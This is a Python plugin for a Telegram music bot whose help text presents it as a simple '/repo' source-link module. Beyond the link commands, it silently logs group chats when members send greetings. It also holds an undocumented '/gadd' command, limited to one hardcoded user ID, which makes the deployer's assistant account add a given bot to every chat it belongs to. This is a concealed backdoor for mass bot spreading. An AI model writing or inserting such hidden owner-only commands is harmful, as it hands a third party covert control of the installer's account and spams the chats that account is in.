import asyncio

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message

from BrandrdXMusic import app
from BrandrdXMusic.mongo.afkdb import LOGGERS as OWNERS
from BrandrdXMusic.utils.database import add_served_chat, get_assistant


@app.on_message(filters.command("repo"))
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://files.catbox.moe/xszuca.jpg",
        caption=f"""✨ ᴊσɪɴ ᴛʜє ᴄʜᴧηηєʟ ɢɪᴠєη ʙєʟσᴡ , ᴧηᴅ ɢєᴛ ᴧᴄᴄєꜱꜱ ᴛσ ϻʏ ꜱᴘєᴄɪᴧʟ ᴄσϻϻᴧηᴅꜱ ᴠɪᴧ ϻʏ ʙσᴛ σᴡηєʀ ᴛʜʀσᴜɢʜ ᴛʜє ꜱᴜᴘᴘσʀᴛ ɢʀσᴜᴘ 💬🌷""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "˹ ɪɴꜰɪɴɪᴛʏ ✘ ɴᴇᴛᴡᴏʀᴋ˼ 🎧", url=f"https://t.me/dark_musictm"
                    )
                ]
            ]
        ),
    )


@app.on_message(filters.command("clone"))
async def clones(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://files.catbox.moe/67ymf1.jpg",
        caption=f"""🌷 ᴄʟɪᴄᴋ ᴛʜє ɢɪᴠєη ʙᴜᴛᴛση ʙєʟσᴡ ᴧηᴅ ᴧꜱᴋ ϻʏ σᴡηєʀ ᴛσ ʜσꜱᴛ ʏσᴜʀ ʙσᴛ 🪷""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "˹ ɪɴꜰɪɴɪᴛʏ ˼ 🎧", url=f"https://t.me/cyber_github"
                    )
                ]
            ]
        ),
    )


# --------------------------------------------------------------------------------- #


@app.on_message(
    filters.command(
        ["hi", "hii", "hello", "hui", "good", "gm", "ok", "bye", "welcome", "thanks"],
        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
    )
    & filters.group
)
async def bot_check(_, message):
    chat_id = message.chat.id
    await add_served_chat(chat_id)


# --------------------------------------------------------------------------------- #


import asyncio


@app.on_message(filters.command("gadd") & filters.user(int(7250012103)))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply(
            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @Snowy_x_musicbot**"
        )
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
        await userbot.send_message(bot_username, f"/start")
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1001754457302:
                continue
            try:

                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                await lol.edit(
                    f"<blockquote expandable>🔂 ᴀᴅᴅɪɴɢ {bot_username}\n\n➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅\n➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌\n\n➲ ᴀᴅᴅᴇᴅ ʙʏ» @{userbot.username}</blockquote expandable>"
                )
            except Exception as e:
                failed += 1
                await lol.edit(
                    f"<blockquote expandable>🔂 ᴀᴅᴅɪɴɢ {bot_username}\n\n➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅\n➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌\n\n➲ ᴀᴅᴅɪɴɢ ʙʏ»@{userbot.username}</blockquote expandable>"
                )
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits

        await lol.edit(
            f"<blockquote expandable>➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅\n➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌\n\n➲ ᴀᴅᴅᴇᴅ ʙʏ» @{userbot.username}</blockquote expandable>"
        )
    except Exception as e:
        await message.reply(f"Error: {str(e)}")


__MODULE__ = "Sᴏᴜʀᴄᴇ"
__HELP__ = """
## Rᴇᴘᴏ Sᴏᴜʀᴄᴇ Mᴏᴅᴜᴇ

Tʜɪs ᴍᴏᴅᴜᴇ ᴘʀᴏᴠɪᴅᴇs ᴜᴛɪɪᴛʏ ᴄᴏᴍᴍᴀɴᴅs ғᴏʀ ᴜsᴇʀs ᴛᴏ ɪɴᴛᴇʀᴀᴄᴛ ᴡɪᴛʜ ᴛʜᴇ ʙᴏᴛ.

### Cᴏᴍᴍᴀɴᴅs:
- `/ʀᴇᴘᴏ`: Gᴇᴛ ᴛʜᴇ ɪɴᴋ ᴛᴏ ᴛʜᴇ ʙᴏᴛ's sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ʀᴇᴘᴏsɪᴛᴏʀʏ.
"""

